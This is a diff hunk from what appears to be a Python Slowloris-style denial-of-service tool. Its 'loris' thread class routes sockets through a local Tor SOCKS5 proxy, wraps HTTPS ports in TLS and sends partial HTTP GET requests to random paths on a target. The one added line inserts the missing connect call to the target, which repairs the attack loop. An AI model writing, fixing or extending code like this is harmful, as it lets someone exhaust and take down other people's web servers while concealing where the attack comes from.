@@ -957,6 +957,7 @@ class loris(threading.Thread):
     s.settimeout=(timeout)
     if tor==True:
      s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
+    s.connect((target, port))
     if ((port==443)or(port==8443)):
      s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
     s.send("GET {} HTTP/1.1\r\n".format(random.choice(paths)).encode("utf-8"))
